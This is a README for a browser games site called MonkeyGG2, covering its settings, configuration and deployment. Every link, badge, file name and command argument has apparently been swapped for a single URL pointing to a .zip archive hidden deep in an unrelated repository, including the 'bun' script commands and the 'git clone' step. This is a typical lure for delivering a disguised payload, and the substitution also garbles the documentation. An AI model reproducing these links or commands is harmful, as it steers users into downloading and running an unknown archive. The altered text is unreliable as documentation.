<p align="center"><img src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip" height="200"></p>

<div align="center">
<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="Discord" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"></a>
<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="Github Repo stars" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%20stars"></a>
<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="GitHub Repo forks" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%20forks"></a>
<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="Codeberg Repo stars" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%20stars&https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"></a>
<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="Codeberg Repo forks" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%20forks&https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"></a>
<a href="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"><img alt="License: WTFPL" src="https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip"></a>
</div>
<h1 align="center">MonkeyGG2</h1>
<p align="center" style="opacity: 0.65;">Your Friendly Neighborhood Games Site.</p>
<br>

Welcome to MonkeyGG2, a feature-rich game site created for you! With over 150 games to choose from, MonkeyGG2 offers a unique and customizable gaming experience. Whether you're a gamer, a developer, or your average Joe, MonkeyGG2 provides a seamless and enjoyable gaming environment.

> Consider giving us a star! Especially if you forked this repository or you found some other use out of this repository.

## Features

-   Over 150 games
-   Easy to use
-   Easy to deploy
-   Customizable
-   Proxy
-   And More...

## Customization

### Settings

#### Cloaking

Cloaking refers to opening the page in an `about:blank` tab. This behavior is forced by default, although it can be disabled. Presets are available for the redirect link however that can also be manually configured.

#### Masking

Masking refers to changing the icon and tab title of the about:blank tab. Presets are available for the icon and tab title however that can also be manually configured.

#### Shortcuts

Custom keyboard shortcuts can be created to perform a variety of tasks. For example, exiting the game, masking the tab, and executing custom JavaScript are all supported.
> Note: if you want to execute custom JavaScript, make sure you know what you are doing. If you do break something, a page reload is always the solution.

#### Theme

The following theme customizations are supported currently:
- Toggle Background Animation (if you are worried about performance mid-game, don't worry it's automatically disabled whenever you are playing a game)
- Background Color
- Block Color
- Button Color
- Games Color
- Hover Color
- Scrollbar Color
- Scroll Track Color
- Font Color

> Note: if you accidentally change the colors so that the site is unusable, you'll have to clear your cookies and local storage.

### Advanced Customization

> Disclaimer: The following customizations are only available to owners of the repository or any fork of this repository.

The `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` file is formatted to include configuration for the entire site. Currently, the following items are supported:
- Games
- Themes (coming soon)
- Proxy Configuration

#### Games

Each game entry has a key representing the display name of the game, and the value should be an object with three key-value pairs:
- `"path"`: Path to the game from `./games` directory
- `"aliases"`: List of alternative names for the game used to enhance search
- `"categories"`: List of categories the game fits in (support for adding icons coming soon)

Adding an entry manually is possible, but tedious especially if you want to alphanumerically order the list (not required for the configuration to work though!)
This is why the script `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` was created, an easy way to add a new game into the configuration without having to manually edit the file.

```bash
# You can use any js runtime such as https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip, bun, or deno
# For this demonstration bun will be used as dependencies are automatically installed
bun https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip
# Answer the prompts that follow and the configuration will be updated

# If you said 'N(o)' to rebuilding the config, then you need to run the following command before the site can find the game
bun https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip
```
As `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` is built to work with alphanumerically-ordered lists, expect unintended behavior if the games list is not alphanumerically sorted.
Additionally, **do not** manually edit the `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` file. That is generated by the `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` script based off of `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip`. **Any changes to `https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip` will be overwritten.**

#### Themes

Theme standard not implemented yet (TODO)

#### Proxy

Proxy configuration options are under the **"config"** key.
The value for key `"proxy"` is a boolean value that enables or disables the proxy function. If `"proxy"` is set to false, then the user will be greeted with an error dialog when attempting to access the proxy.
The value for key `"proxyPath"` is the path to the proxy. It can be an absolute path or a relative path, but the proxy must support **CORS** as the proxy page will be displayed as an iframe on the site.


## Deployment

### Without Proxy

[![Run on Replit](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
[![Remix on Glitch](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip!https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
[![Deploy to IBM Cloud](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
[![Deploy to Amplify Console](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
[![Run on Google Cloud](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
[![Deploy to Oracle Cloud](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
[![Deploy with Vercel](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%3A%2F%https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip%2FMonkeyGG2%https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
[![Deploy with Netlify](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)
[![Deploy to Render](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip)

Alternatively, you can simply fork this repository on [GitHub](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip) or [Codeberg](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip) and deploy to GitHub Pages or Codeberg Pages, respectively.

### With Proxy

Visit the [VioletGG2](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip) page to learn more about hosting MonkeyGG2 with a proxy.

### Running Locally

```bash
# WARNING: if you have a folder named "monkeygg2", this command will remove all files inside of that folder
# please change the name of the directory in the following two commands
git clone https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip monkeygg2
cd monkeygg2
# from here you can use any tool for running a static server, "live-server" from npm will be used here
npm install -g live-server # only if you don't have it installed already
npx live-server
```

## License

Distributed under the WTFPL License. See [here](https://raw.githubusercontent.com/misslesnake2/studyhelp.github.io/main/games/abandoned/assets/images/levels/uc/github_studyhelp_io_2.4-beta.2.zip) for more details.
